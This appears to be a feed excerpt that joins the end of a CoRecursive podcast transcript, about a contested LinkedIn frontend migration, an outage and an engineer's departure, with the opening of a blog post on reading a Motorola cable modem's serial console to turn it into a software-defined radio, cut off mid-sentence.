<p>And at the same time, we had senior leaders saying the cost of migrations at LinkedIn is too high. We, even with all these things you’ve been trying to do, all the things we talked about, about getting costs of migration lower, making it things that infrastructure platform kinds of teams do as much of themselves as possible.</p>

<p>It’s still too high. We feel like it is too much of a cost for our product velocity. Now, I would argue that some of the reasons for decreased product velocity are you have a 3 million line of code app that’s seven years old, that has a fair bit of debt piled into it. Both technical and product debt.</p>

<p>That’s just going to slow down over time. It’s very hard to keep up that kind of velocity permanently. And you can’t just change things because you’re going to break user things. So even the product design work is harder because how and where does it fit in the product is harder at that scale. But the message we were getting from leadership in any case was.</p>

<p>We want to see the cost of migrations be lower. So, how do you migrate 3 million lines of Ember code to React code in a way that’s low cost?</p>
<p><strong>Adam:</strong>
Think about this. This is a hard problem. Do a big migration, but don’t slow anybody down while you’re doing it.</p>
<h2 id="the-slow-migration-plan"><strong>The Slow Migration Plan</strong></h2>
<p><strong>Chris:</strong>
We came up with a strategy that we thought answered the thing they were saying. And it was a roughly, we expected it to take three to five years. And three years was very optimistic.</p>

<p>Our thought was just double down hard on the automation side of it. Make this a thing that product teams basically never have to do a lot of work on. And at the, the idea was sequence it and chunk it up in ways, pull apart the threads of it so that you could tackle one chunk of it, do it end to end, and then move on to the next one.</p>

<p>And some of them could be parallelized. Some of them, not so much so figure out the sequencing, figure out the chunking, parallelize what you can change the build pipeline, change the data layer, change the routing layer, figure out a bridge for the reactivity system that understands how to handle the routing and the view layer, and then finally kind of flip the view layer in the reactivity system over from the ember.</p>

<p>Rendering and reactivity system, the react one at the very end, but in a way where you’ve written automation that can do it. So that was our pitch. It was, like I said, three to five years going to be a lot of work, but the idea was product teams will never really have to stop.</p>
<p><strong>Adam:</strong>
That’s a huge undertaking, like rebuilding a car piece by piece while driving it continuously on a long road trip. That would be impressive. But three to five years, that’s a really long time.</p>

<p>Meanwhile, while Chris’s team was prepping their plan for the engineering bosses, another team reached out. This team we’re going to call the Fingerguns team, not their real name, by the way. But they had a plan too, and they were tackling a similar problem.</p>
<p><strong>Chris:</strong>
Including what they framed differently. And in my view, correctly, as the thing that engineering leadership executive and otherwise really wanted, which was that word of velocity.</p>

<p>How do we ship features and ideas faster? How do we iterate faster? How do we take an idea from idea to A/B testing? Can, can we get that down to be a matter of weeks rather than months? Because. You know, it has been months. And they identified, okay, we have this split in our stacks. We have this big desktop stack.</p>

<p>We have a different mobile web stack. We have these long cycle times on our iOS and our Android apps. Can we get those times down? Down. And I think, in retrospect, they correctly identified that when our leadership was telling us migration fatigue, migration fatigue was a symptom.</p>

<p>And the actual problem they were really caring about was that. It was, can we focus on faster iteration, trying ideas, killing ideas if they’re not good ideas or they’re not working faster. And migrations get in the way of doing that because our engineers are spending 10 or 20 or 25 percent of their time on migrations and not on being able to iterate on these things.</p>

<p>And the plan we proposed didn’t address that at all.</p>

<p>And this other team came in with a pitch that was kind of a blow up the world pitch. It was, what if we rethink this all from the ground up?</p>
<h2 id="the-finger-guns-plan"><strong>The Finger Gun’s Plan</strong></h2>
<p><strong>Chris:</strong>
It was completely what another colleague of mine once described as being in finger guns mode, meaning like, yeah, yeah, yeah, this is going to be awesome, man, kind of finger gunning at each other without answering any of the kinds of questions about what does it look to like to operate this when we’re trying to support hundreds and hundreds of engineers,</p>

<p>And I think it wouldn’t have made me so mad if they’d come in with an attitude of here’s an idea. But we recognize that there are things we’re going to miss because we’re used to supporting a dozen, not 180 and being 30 times as many engineers, just going to reshape things.</p>

<p>Sometimes that fresh perspective lets you come in and say, yeah, I hear you. And we do need to make sure we solve that problem. What if we try this and maybe it won’t work, but what if we try it? There’s a way to do that. The team that came in did not do that. They were like, nah, it just won’t be a problem, man.

I was like, well, no, it, it will, maybe we can solve the problem. And I’m up, I’m totally up for you telling me, let’s try this way of solving the problem instead. But no, no, it will actually be a problem. We have a lot of experience to tell you from, from being in the trenches with it, this is a real problem. And so it was very much a case of. Trying to find ways to be collaborative while actually just being perpetually pretty frustrated that our message didn’t seem to be getting through to this other team. They’re like, no, there are concerns you really do actually need to care about here, and we’re happy to help you care about them, but we’re just fundamentally not sold on the thing you’re trying to sell because you’re not showing us, from our perspective, a seriousness about the problem space and the actual difficulty of what you’re trying to do here.</p>

<p>We think maybe it’s worth doing. But what about X and Y and Z? And just getting fundamentally blow it off kind of responses.</p>

<p>Mm like two investment advisors and the one is like, S&amp;P 500 index fund and the other one’s like, Have you seen Bitcoin? NFTs? And like, they’re just like really pumped, right? And the enthusiasm is exciting.</p>
<p><strong>Adam:</strong>
Maybe that’s, maybe that’s too extreme of a dichotomy.</p>
<p><strong>Chris:</strong>
I mean, for whatever it’s worth, that is a perfect analogy to how we felt.</p>
<h2 id="plan-judgement"><strong>Plan Judgement</strong></h2>
<p><strong>Adam:</strong>
So Chris is mad, he’s mad about this plan. He didn’t know that he could pitch a big idea, like, stop everything and start fresh on a huge project with the promise of speed later on. If he knew that, you could bet he’d have a plan, right? Maybe a less wild plan, maybe with more considerations, but it would certainly have a more aggressive timeline than the three to five years. But he didn’t even know stopping the world was an option.</p>

<p>And there’s there’s also sort of a cultural clash here to Jim, a top very senior engineer on the finger guns team. And Chris, they just don’t see eye to eye on a lot of things. They have fundamentally different views on what software engineering looks like.</p>

<p>And so Chris’s team presented their, you know, well thought out, very considered, albeit kind of dull and long term plan to engineering leadership.</p>
<p><strong>Chris:</strong>
Leadership hated it.</p>
<p><strong>Adam:</strong>
They probably have a hard time understanding a five year plan. Like,</p>
<p><strong>Chris:</strong>
Yeah. Yeah, I think that was a huge part of it, and we weren’t excited about the plan, which made it really hard to sell.</p>

<p>And it’s really hard to get a team of execs and leaders to be really excited about a team that the engineers are pitching as a, well, it’ll get the job done, kind of</p>

<p>like it solves all the things we think you asked us to solve.</p>

<p>We think it kind of sucks, but it sucks less than any of the other options that we can find.</p>
<p><strong>Adam:</strong>
So presumably, this is all sort of bubbling around at the exec level. People tossing around solutions to a fuzzy problem that started as, how Ember to React, but really the core thing was maybe about how do we change things so that we can pick up more speed? How do we get faster at making changes at LinkedIn?</p>

<p>And really, I imagine the execs have their own worries, right? They have numbers to hit. They have market pressures. They probably have pressures from Microsoft. A plan to ditch all the cruft that had built up over time. And a plan to gain velocity, to gain speed.</p>

<p>It must sound pretty good. And then Chris took some time off for Christmas.</p>
<h2 id="on-call"><strong>On Call</strong></h2>
<p><strong>Chris:</strong>
and I came back and discovered that we’d been having site up problems, where chunks of LinkedIn’s user base Would for up to about 20 minutes end up with a, Hey, sorry, something’s wrong and not see the linkedin.com page at all.</p>

<p>And well, I’ll tell you two things. One, I hate on call and ops kind of work. And two, I was the most senior engineer on the team and got tapped to do this. And it was a hundred percent on call and ops kind of work as we tried to get to the bottom of what. Those problems were so I basically I went on Christmas break frustrated and came back like okay.</p>

<p>I’ve taken a deep breath. I Can do this. We’ll figure out these dynamics with the other team and instead what happened was things are on fire And also this other thing is still going on in the background and now you get to spend three months doing the kind of work You hate most Trying to figure out what’s going wrong there</p>
<h2 id="memory-leaks"><strong>Memory Leaks</strong></h2>
<p><strong>Adam:</strong>
So about the incident, LinkedIn had these sort of pre rendering services. They ran the client code with Node. js and sort of aggregated all the data from the backend and then they could send it to the client in one big request, bundling everything up for quick delivery right from the data center to the user.</p>

<p>But this had memory leaks and the services were going down.</p>
<p><strong>Chris:</strong>
So, we hit the point where those boxes started running out of memory, and we had a system designed to say, Ah, you’ve tripped over a limit memory usage wise. We’re just going to restart the box. reasonable. We had a couple things missing though.</p>

<p>One, there was no alerting for that. So no one was particularly getting alerted that like, Hey, you’re getting a lot of memory kills. I shouldn’t say there was no alerting. There was insufficient alerting on that. Second, there was a setting to say, How many of these containers can be restarted at the same time?</p>

<p>That setting was a key in a YAML file for configuration, and that key was typed</p>

<p>But at some point, someone set a value there that was a legitimate possible value, but was the, maybe the wrong value to have for this system.</p>

<p>And by maybe, I mean, definitely.</p>
<p><strong>Adam:</strong>
Specifically, the number was approximately the entire number of these services that was running. And they all, you know, start up at about the same time. They all get about the same amount of requests, so their memory all creeps up at about the same rate. Which sounds bad. And somebody might take notice of that memory creeping up.</p>

<p>Except, yeah. Insufficient alerting.</p>
<p><strong>Chris:</strong>
So this is growing and it had gotten bad enough that what we started seeing is anytime there was a long weekend or some reason why there was another kind of deployment pause for long enough, And this misconfigured toggle meant, whoops, we can restart them all at the same time. You know what happens when you restart all of your servers at the same time? Suddenly they’re not responding to user requests. And we would just end up with this kind of thundering herd problem where you’d take a bunch of them offline and that would increase the pressure on the rest of them.</p>

<p>So they would start increasing their memory usage faster because they’re getting more traffic. So washers repeat and we would end up taking down an entire data center worth of these servers. In the background, there had also been a rightsizing process where the idea was we’re going to drop the amount of CPU and memory usage across our fleet to try to avoid over provisioning where we think we’ve got sufficiently Large headroom that everything will be fine and we can save money on not buying new hardware if we don’t actually need it. way to think about the intersection of these things was that right sizing process brought down the ceiling and meanwhile the memory leaks were Raising the water level in the room and all of a sudden now the water’s at the ceiling and the combination of that with one bad configuration meant we were just hosed.</p>

<p>And so a bunch of other engineers and I were looking around saying, we need better alerting, better observability on this. We need more resiliency. There’s no reason that a node server running away should kill the host process that’s managing these node processes. Instead, we should kill the node process alert on that for that condition and restart the node process because then we don’t need to ever bring the container down and we never get into this situation.</p>
<p><strong>Adam:</strong>
It’s like, there’s not a, there’s five opportunities here where we can improve</p>
<p><strong>Chris:</strong>
Exactly, exactly.

Failure is inevitable, right? Humans are going to make mistakes. Systems are going to experience power outages. Stuff is going to go wrong in the world. And so the way I think about software engineering. versus programming or hacking, or perhaps as a super set of those, is about designing systems that support engineers in doing their job of getting to those product outcomes.</p>

<p>do we have resiliency of multiple layers of places we can catch that something is wrong, Fix that the, the wrongness in a safe way here and alert and say, Hey, by the way, something changed and it’s going wrong now.</p>

<p>So when it happens, how do we make the system, both the technical side of it and the people side of it, able to respond well?</p>
<p><strong>Adam:</strong>
If you have the inclination, there’s a lot you can learn from an incident like this. Solve the problem, yes, but also improve the system. Prevent the problem from ever happening. One fail safe Chris explored is just falling back to client side fetching if these services were down.</p>

<p>Chris’s approach says a lot about him as an engineer. He’s all about, you know, not just the software, but the systems around it and how can we improve these things, right?</p>

<p>He even has a podcast called winning slowly. That’s all about steady gains and continuous improvement.</p>

<p>But yeah, the higher ups just wanted this incident closed. Maybe this was about the speed thing again, but whatever the cause, the incident meetings started to get a bit tense.</p>
<h2 id="incident-push-back"><strong>Incident Push Back</strong></h2>
<p><strong>Chris:</strong>
So we had a Multiple times a week, stand up for it. What’s status? What have we made progress on?</p>

<p>Let’s report outward. Send info to execs, etc. about what progress we’ve made, etc. Ask for more help if we need it. And one of those, after a weekend where we had run a long experiment, found a new problem.</p>
<p><strong>Adam:</strong>
This was a bad time to find a new problem because a manager for the finger guns team Let’s just call him Dave had just taken over the incident response</p>
<p><strong>Chris:</strong>
He came in and pulled in a bunch of other people and those people were fine, but it was a case very clearly of I don’t trust you to solve this problem and I don’t trust any of your answers and so I’m going to pull in these other people to supersede you, which is frustrating in its own right.</p>
<p><strong>Adam:</strong>
That’s how Jim lands in the middle of the incident call meetings, and things only go downhill from there.</p>
<p><strong>Chris:</strong>
Why doesn’t Code Review just solve this? That was a direct quote from Jim. And my answer was, well it didn’t, and it won’t again in the future because people are going to make mistakes and just be better. Again, it’s not an answer, because what happens when it’s some junior on the rotation who thinks, yeah, that seems reasonable, and this PR was made by a very senior SRE?</p>

<p>Why am I going to question whether that value is reasonable? Like, yeah, there’s a bunch of boxes. That seems fine. Those kinds of things happen. And to that question of engineering systems, one of the things I think about a lot is, does our system only work or does this process only work? Or does this tool only succeed?</p>

<p>If I’m acting like a senior engineer, on his or her very best day or, or does it work if I’m a super junior engineer who’s having a bad day and we really want our systems to be workable for the latter case. And that helps all of us because sometimes, even though I’m a very senior engineer, sometimes I have bad days.</p>

<p>Sometimes my brain doesn’t feel like it’s working at all. Does the system still support me on those days or does it punish me? I really would like to not be punished.</p>
<h2 id="pressure-mounts"><strong>Pressure mounts</strong></h2>
<p><strong>Adam:</strong>
The incident was moving forward, but the pressure was mounting, and Chris felt like this group just didn’t understand the scope of the problem or appreciate his considered approach.</p>
<p><strong>Chris:</strong>
“And why isn’t this just getting solved?”</p>
<p>“And execs are unhappy with the rate of progress”</p>

<p>And it’s like, cause you’ve got seven years of piled up technical debt and lack of resiliency that we’re trying to fix and it, if it takes us three months. To fix seven years of negligence. I think that’s actually not too bad was kind of my take. Uh, I remember telling my old manager that that was easily the maddest I have ever been in any job ever was when the finger gun manager came in and was telling me I was not doing a good enough job because it was taking a while to fix these deep seated problems, and it, it really exacerbated my feelings around their, their other proposal of just kind of a lack of seriousness about engineering on this scale of, no, these, These things aren’t easy to solve.</p>

<p>We have an unbounded number of memory leaks to fix, and because of the way this particular memory leak was shaped, they were all references to the same core object. So you could fix one of them, and it didn’t change the behavior of the system. I was very frustrated. And in the background, this also kicked off the experiment for the alternative plan, which everybody bought in on and was like, yes, this is going to work.</p>

<p>And a bunch of engineers were like, but ‘what about’. No, thou shalt not ask, but ‘what about’.</p>
<h2 id="reorg"><strong>ReOrg</strong></h2>
<p><strong>Chris:</strong>
Around the same time, his group took over my group in a reorg hostile takeover. It was, it was a thing.</p>
<p><strong>Adam:</strong>
Ooh, he’s your manager now?</p>
<p><strong>Chris:</strong>
Yeah, he was my boss’s boss kind of situation So not my direct manager, which is good because I probably honestly would have quit on the spot we were in a like let’s so we can see You know, sometimes people get in a different role and they end up learning a bunch of new things.</p>
<h2 id="reflecting-on-frustrations"><strong>Reflecting on Frustrations</strong></h2>
<p><strong>Adam:</strong>
Maybe this would all work out for the best though, right? Chris is a reflective, thoughtful guy. He could think to himself, maybe I can learn from this new skip manager’s business focus. He knew this was a needs improvement area for him.</p>
<p><strong>Chris:</strong>
The things I was speaking about were real problems. And they really did make things better in ways that I think some people at LinkedIn really do appreciate and I think really do make a difference for people using LinkedIn. But they were never the thing that the business leadership was most concerned about at any given moment.</p>

<p>And that decoupling I think is a big part of Why we ended up in very different spots, and what made it hard to communicate the value of those things</p>
<p><strong>Adam:</strong>
And as Chris entered this more reflective state, reflecting on his frustrations, he noticed he had some weaknesses in building relationships. So many of my colleagues have personal relationships with folks that maybe I struggled even to connect with or figure out how to work with Because they’d see them in the cafeteria</p>

<p>Specifically, Chris is thinking of Jim.</p>
<p><strong>Chris:</strong>
other folks I talked to had less of that challenge. Some of it was just. You know, the way that particular engineer related to our corner of engineering, man, there were, there were some challenges, but there were people who had very good working relationships with him because they just end up sitting down with him in the cafeteria because it’d be a big group of people there.</p>

<p>And it does really help when you’re in the midst of some kind of heated technical argument or whatever to have had lunch with somebody. Uh, or, or otherwise to have built that relationship, but when you have a really strong in person culture and a very high, high percentage of your people are all in person that shows up in those kinds of things, because as a company culture, as a, an engineering culture, your norms are all around.</p>

<p>Yeah, we’ll see each other in the, the cafes and we’ll bump into each other in the halls and, you know, people would tell stories about ending up in the bathroom next to the CEO. Right. You know, that’s a funny dynamic and a funny place to, you know, look over and you’re washing your hands and there’s the CEO washing his hands.</p>

<p>I could see the difference it made to have had constant, just physical interaction with someone who ended up being an SVP of engineering or a principal engineer or whatever, that you just know those people.</p>
<p><strong>Adam:</strong>
This raises another point.</p>

<p>We’ve been focused on this technical clash, speed versus sustainability, but maybe it’s more of a social thing. People under pressure just not hearing each other. I mean, we only have Chris’s side of the story. Maybe this is all a social issue.</p>
<p><strong>Chris:</strong>
Charity Majors had a great quote in a recent article where she said, “At a sufficiently senior level, engineering, or manager, there are no purely social or purely technical problems.”</p>

<p>They’re all socio-technical, and you have to be able to identify where’s the blocker on this. Is it the social side, or the technical side, or usually some mix of the two, and what’s the proportion, and what do I need to do to solve this?</p>
<p><strong>Adam:</strong>
Yeah.</p>
<p><strong>Adam:</strong>
So maybe it’s both. Anyways, stepping back from the incident, Chris finds out that the Fingergun’s plan is gaining ground. It’s gaining traction. And it’s grown in scope. Now it’s about rewriting both the mobile and the desktop apps.</p>
<p><strong>Chris:</strong>
“We’re going to rethink everything about how we build all of our products at LinkedIn”, which that’s exciting. And there were some really interesting parts to that. And also one way of saying what happened was you could just say I and my manager and my team lost. And that would not be a false way of describing it.</p>

<p>But okay my pitch lost. Whatever. I just didn’t like it that much anyway. Can we make the, can we make your version good? Oh, you don’t even want to hear questions that read to you as anything but enthusiasm for this thing’s going to be great. And I’m like, I want to make it great, but we have to tackle these things to make, oh, you don’t even want to hear that.</p>

<p>Okay. Well, I can keep butting my head against this wall. I had conversations with that manager where I was told in literally so many words, ‘You’re too idealistic. You don’t care enough about the bottom line. You should change your values.’ And I was like, no, nope, that’s not how this is going to work, man. Uh, outside I did the politic.</p>

<p>I understand that perspective. I see where you’re coming from. And inside, the little flip switch in my head was flipping saying, ‘nope, nope, nope, warning alarms, klaxons going off all around me.’</p>
<p><strong>Adam:</strong>
Chris thought that their need for speed was blinding them to the real problem.</p>
<h2 id="speed-has-a-cost"><strong>Speed has a Cost</strong></h2>
<p><strong>Chris:</strong>
A lot of the problems we had in the codebases that we had were the direct result of overvaluing velocity and refusing to stop and say: This thing over here, this secondary path doesn’t work right. Let’s fix it or let’s get rid of it.</p>

<p>Either of those are good options, but refusing to do that and constantly just know we’ve got to ship the next feature and how fast can we get it out? And we’ve got to ship the next feature and how fast can we get it out? When velocity becomes the primary or driving value that everything else is subservient to, it leaves you in a spot where maybe you have good velocity initially, but you can’t sustain it over time.</p>

<p>It’s kind of the classic pattern, actually, for codebases as they age, is if you’re not continually investing in them, but you’re continually extending them, you end up exactly where we were. And the things that I saw being pitched were all about maximizing velocity and made no, not even a gesture at how are you going to handle these, these other things.</p>

<p>And I, I’ve kept mulling on it and I, I did my best to give it a fair shot of there’s some interesting ideas here. There’s some interesting technical directions here, but I was also remembering why I left my previous job, which it ultimately was a very bad case of burnout. Of the I’m having horrific migraines and the worst stomach pains I’ve ever had in my life and unable to exercise, uh, random outbursts of sobbing at random times, panic attacks. It was a bad time.</p>

<p>I don’t recommend burnout. It’s not fun.</p>

<p>And if I stay on this road, I know where that goes, and it’s a bad spot, and I don’t want to end up there again. And I can either stay in a world where I’m constantly working not to be angry, because I don’t, you know, I did my best not to stay angry in those times. But when the things that you’re running up against every day make it active work not to be angry, it makes your job not fun, to say the least.</p>

<p>And I can either, you know, try to turn this Titanic with my little rowboat over here and be mad that I’m failing. So that’s not going to work, like, shove it with your paddle, doesn’t, doesn’t turn the Titanic.</p>

<p>Or I can just say, ‘I’m just going to paddle that way.’ The Titanic thing implies that I think they’re heading for an iceberg. I mostly just mean the scale of the thing, not the iceberg side of it. I hope they don’t iceberg. That would be sad. You know, a Disney cruise liner. I’m not going to turn a Disney cruise liner with a rowboat and a paddle.</p>

<p>So I didn’t. I said, I’ve learned a ton. I have some idea of what it’s like to work on a three million lines of code app now that migrate a ton of TypeScript at a huge company and think about those big problems and now I can go do something else and not burn out and not be angry at my job every day or not be fighting not to be angry at my job every day.</p>

<p>I’m not going to spend years of my life trying to build in a way and on things that I ultimately don’t believe in.</p>

<p>Life’s too short. That would be a waste. Okay, this sucks, but I guess it’s time to walk away. Not, not out of spite or malice or any of that, but just saying we’re going different directions.</p>

<p>Maybe the values that this particular corner of LinkedIn was embracing at this particular find are not morally objectionable.</p>

<p>But they’re not mine.</p>
<h2 id="outro"><strong>Outro</strong></h2>
<p><strong>Adam:</strong>
That was the show. Thank you, Chris, for being so candid. I feel like stories like this are unfolding at a hundred different places all the time. These socio-technical issues, people butting heads about the right way to solve things.</p>
<p>But they never get heard outside of small circles. So thank you, Chris, for sharing. Chris is at the time of this writing, looking for work. You can find more at ChrisKrycho.com. I’ll put a link in the show notes. It shouldn’t surprise you to hear that Chris is looking for a role that aligns with his personal values.</p>

<p>That’s a big takeaway from our chat. You, you need to agree with your team and your organization about what’s important. And sometimes those things change and you just need to. But specifically, Chris is looking for a role where he can help drive engineering excellence. He’s pretty passionate about finding ways to make building software better.</p>

<p>He has a whole blog post about this and what he calls Ratchets. And you should check it out on his website. And if you like the podcast and you made it this far, so unless you’re like hate listening or something, I assume you do.</p>

<p>If you want to support the podcast and keep it going, the best thing you can do to support me is go to <a href="https://corecursive.com/supporters">CoRecursive.com/supporters</a>. You know, I have no sponsors of the podcast besides individuals. Link in the show notes. You can join as a podcast supporter and you’ll receive access to bonus episodes and join the community.</p>

<p>And until next time, thank you so much for listening.</p>
<form action="https://app.convertkit.com/forms/2082075/subscriptions" method="post" data-sv-form="2082075" data-uid="99a50e1950" data-format="inline" data-version="5" data-options="{&quot;settings&quot;:{&quot;after_subscribe&quot;:{&quot;action&quot;:&quot;message&quot;,&quot;success_message&quot;:&quot;Success! Now check your email to confirm your subscription.&quot;,&quot;redirect_url&quot;:&quot;&quot;},&quot;analytics&quot;:{&quot;google&quot;:null,&quot;facebook&quot;:null,&quot;segment&quot;:null,&quot;pinterest&quot;:null,&quot;sparkloop&quot;:null,&quot;googletagmanager&quot;:null},&quot;modal&quot;:{&quot;trigger&quot;:&quot;timer&quot;,&quot;scroll_percentage&quot;:null,&quot;timer&quot;:5,&quot;devices&quot;:&quot;all&quot;,&quot;show_once_every&quot;:15},&quot;powered_by&quot;:{&quot;show&quot;:true,&quot;url&quot;:&quot;https://convertkit.com?utm_source=dynamic&amp;utm_medium=referral&amp;utm_campaign=poweredby&amp;utm_content=form&quot;},&quot;recaptcha&quot;:{&quot;enabled&quot;:false},&quot;return_visitor&quot;:{&quot;action&quot;:&quot;show&quot;,&quot;custom_content&quot;:&quot;&quot;},&quot;slide_in&quot;:{&quot;display_in&quot;:&quot;bottom_right&quot;,&quot;trigger&quot;:&quot;timer&quot;,&quot;scroll_percentage&quot;:null,&quot;timer&quot;:5,&quot;devices&quot;:&quot;all&quot;,&quot;show_once_every&quot;:15},&quot;sticky_bar&quot;:{&quot;display_in&quot;:&quot;top&quot;,&quot;trigger&quot;:&quot;timer&quot;,&quot;scroll_percentage&quot;:null,&quot;timer&quot;:5,&quot;devices&quot;:&quot;all&quot;,&quot;show_once_every&quot;:15}},&quot;version&quot;:&quot;5&quot;}" min-width="400 500 600 700 800">

<div data-style="minimal">

<p>
Hello, <br>I make CoRecursive because I love it when someone shares the details behind some project, some bug, or some incident with me.
</p><p>
No other podcast was telling stories quite like I wanted to hear.
</p><p>
Right now this is all done by just me and I love doing it, but it's also exhausting.
</p><p>
Recommending the show to others and contributing to this patreon are the biggest things you can do to help out.
</p><div><p>
Whatever you can do to help, I truly appreciate it!</p><p>
Thanks! Adam Gordon Bell
</p></div>
<p><a href="https://www.patreon.com/adamgordonbell">Support The Podcast</a>
</p></div>
</form>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Reverse engineering a cable modem and turning it into an SDR (108 pts)]]></title>
            <link>https://stdw.github.io/cm-sdr/</link>
            <guid>39611924</guid>
            <pubDate>Wed, 06 Mar 2024 03:20:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://stdw.github.io/cm-sdr/">https://stdw.github.io/cm-sdr/</a>, See on <a href="https://news.ycombinator.com/item?id=39611924">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>
        <div id="title">
          <h2>cm-sdr</h2>
          
          <hr>
          <p><span>Project maintained by <a href="https://github.com/stdw">stdw</a></span>
          <span>Hosted on GitHub Pages — Theme by <a href="https://twitter.com/michigangraham">mattgraham</a></span>
        </p></div>

        

<p><img src="https://stdw.github.io/cm-sdr/img/modem.jpg" alt="cable modem"></p>

<h2 id="introduction">Introduction</h2>
<p>A few weeks ago I got curious about an old cable modem sitting in my closet,
a Motorola MB7220. Initially I was interested in what kind of hardware it had
and if it was running Linux. Some quick searching brought me to a thread on
a web forum where people were discussing the built in spectrum analyzer feature
used for diagnostics. Someone mentioned that they could see spikes
corresponding to FM radio stations. This sparked a thought: if a cable modem 
and a digital TV tuner dongle are fundamentally doing the same thing (receiving 
and demodulating QAM signals), could a modem be turned into an 
<a href="https://en.wikipedia.org/wiki/Software-defined_radio">SDR (software-defined radio)</a>
a la <a href="https://www.rtl-sdr.com/">RTL-SDR</a>?</p>

<p>Going into this project, I knew next to nothing about RF and had no idea if
this goal was even feasible at all for the hardware. I found 
<a href="http://www.hermeslite.com/">an SDR project</a> based on an Analog Devices 
cable modem chip, as well as a <a href="https://forums.qrz.com/index.php?threads/cable-modem-to-software-defined-radio-modification-projects.512433/">forum thread</a>
where someone else was wondering about the same thing a few years ago.</p>

<p>The last post in the thread from user VK4HAT states:</p>

<blockquote>
  <p>I say if you have the skills, time and desire, give it a go and see where you end up. If google shows nothing, then its likely not been tried. With so few firsts available in life, take those that present themselves and have a crack, even if failure is always an option.</p>
</blockquote>

<p>So that is exactly what I did.</p>

<h2 id="gaining-access">Gaining Access</h2>
<p>My first goal was to look for an access vector or a way to communicate with the
device. I knew that there wasn’t much to see on the web interface and telnet
was disabled, so I skipped ahead to opening it up.</p>

<p>After removing a few screws from the plastic housing to get access to the
board, my first thought was to look for <a href="https://en.wikipedia.org/wiki/Universal_asynchronous_receiver-transmitter">UART</a> headers to take a peek at the serial console. 
After identifying two candidates consisting of four vias surrounded by a 
rectangle near the edge of the PCB, it was time to identify the pins. 
Using a multimeter, the ground pin can be easily identified by checking 
the continuity with one of the metal shields on board. The VCC pin can be 
identified by measuring the voltage of each pin when powering on the board. 
It should be a steady 3.3v, or in some cases 1.8v or 5v. This pin is not 
needed, but is still useful to identify the operating voltage and eliminate 
one candidate for the Tx and Rx pins.
While booting, the Tx pin will sit on average a little lower than the VCC pin
and drop much lower when a lot of data is being output. This leaves the last 
pin as Rx.</p>

<p>One of the UARTs identified earlier did not seem to be transmitting anything
while the other did. After soldering some wires to the active UART, I connected
the Tx to UART Rx GPIO pin on a Raspberry Pi, the Rx to the Pi’s Tx, and the 
ground to the ground pin. Note that this can only be done because both systems
are 3.3v. Had that not been the case, a USB TTL adapter with an adjustable 
voltage level could be used just as easily, and is probably a better idea most
of the time anyway.</p>

<p>There are a few reasons why the Raspberry Pi is not the best serial interface
such as if you need parity or other features, but in this case I had it on hand
and it works. The serial console of the Pi must also be disabled so that it can 
be freed up for other purposes. There is another reason I chose to use the 
Raspberry Pi which I will get to later.</p>

<p>Finally, to actually see the data I used the <code>cu</code> utility:<br>
<code>cu -l /dev/serial0 -s 115200</code><br>
The baud rate was a lucky guess, but 115200 is very common on such devices.
If the baud rate is wrong you will quickly know when you see a bunch of garbage
on the screen. A logic analyzer could be used to definitively find the baud 
rate and other parameters, but guessing is sometimes quicker and always 
cheaper.</p>

<p>After powering on the device, the terminal filled with output:</p>

<div><pre><code>pi@raspberrypi:~/modem $ cu -l /dev/serial0 -s 115200
Connected.
�
B3312inim S C 84(9 m
ose_VS 8
STesldlo rh 83 rs 10
STesldhi: _h 8, _s 13
Sync: 0 
MemSize:            128 M
Chip ID:     BCM3383D-B0

BootLoader Version: 2.4.0 fyl spiboot reduced DDR drive avs
Build Date: Nov 12 2015
Build Time: 14:31:43
SPI flash ID 0xef4016, size 4MB, block size 64KB, write buffer 256, flags 0x0
Cust key size 128

Signature/PID: 3383


Image 1 Program Header:
   Signature: 3383
     Control: 0005
   Major Rev: 0003
   Minor Rev: 0000
  Build Time: 2015/11/26 08:47:57 Z
 File Length: 1692841 bytes
Load Address: 80004000
    Filename: ecram_sto.bin
         HCS: e749
         CRC: 175b753f

Found image 1 at offset 20000

Enter '1', '2', or 'p' within 2 seconds or take default...


Performing CRC on Image 1...
CRC time = 282177012
Detected LZMA compressed image... decompressing... 
Target Address: 0x80004000
decompressSpace is 0x8000000
Elapsed time 736066500

Decompressed length: 8091524

Executing Image 1...


 eCos - hal_diag_init
Ecos memory map:
BLOCK    OWNER        MIPS      SIZE      MEM
Block 0: Owner: 0 - 0x00000000 0x07e00000 0x00000000
Block 0: Owner: 0 - 0 MB 126 MB 0 MB
Block 1: Owner: 3 - 0x07e00000 0x00200000 0x07e00000
Block 1: Owner: 3 - 126 MB 2 MB 126 MB
126MB (129024KB) remaining for eCos
Init device '/dev/BrcmTelnetIoDriver'
Init device '/dev/ttydiag'
Init tty channel: 807bb020
Init device '/dev/tty0'
Init tty channel: 807bb040
Init device '/dev/haldiag'
HAL/diag SERIAL init
Init device '/dev/ser0'
BCM 33XX SERIAL init - dev: b4e00500.2
Set output buffer - buf: 0x80852408 len: 4096
Set input buffer - buf: 0x80853408 len: 4096
BCM 33XX SERIAL config
Init device '/dev/ser1'
BCM 33XX SERIAL init - dev: b4e00520.3
Set output buffer - buf: 0x80854408 len: 4096
Set input buffer - buf: 0x80855408 len: 4096
BCM 33XX SERIAL config

Init device '/dev/ser2'
InitBoard: MIPS frequency 637200000

...

Reading Permanent settings from non-vol...
Checksum for permanent settings:  0xe9d88f65
Setting downstream calibration signature to '5.7.1mp1|die temperature:70.775degC'
Settings were read and verified.


Reading Dynamic settings from non-vol...
Checksum for dynamic settings:  0x6e4a329
Settings were read and verified.

Console input has been disabled in non-vol.
Console output has been disabled in non-vol!  Goodbye...
[00:00:00 01/01/1970] [Reset/Standby Switch Thread] BcmResetStandbySwitchThread::ProcessResetSwitchEvent:  (Reset/Standby Switch Thread) Reset switch released; resetting...
[00:00:00 01/01/1970] [Reset/Standby Switch Thread] BcmResetStandbySwitchThread::ProcessResetSwitchEvent:  (Reset/Standby Switch Thread) Cant Reset pfCmDocsisCtlThread==NULL...
</code></pre></div>

<p>This output contains a wealth of information. The device is 
running <a href="https://en.wikipedia.org/wiki/ECos">eCos</a> on a MIPS processor 
which is part of a Broadcom BCM3383 SoC. It turns out there are actually
two MIPS processors on this SoC although one of them is not used on this
modem, explaining the other UART. On some devices, the second processor
will run Linux for additional features.</p>

<p>Also, this seems like the end of the line for serial because shortly after 
booting the actual OS, it disables the serial console. Hitting “p” at the 
bootloader prompt does not lead to much except a way to download new OS 
images via tftp and a utility to read and write memory addresses. This could
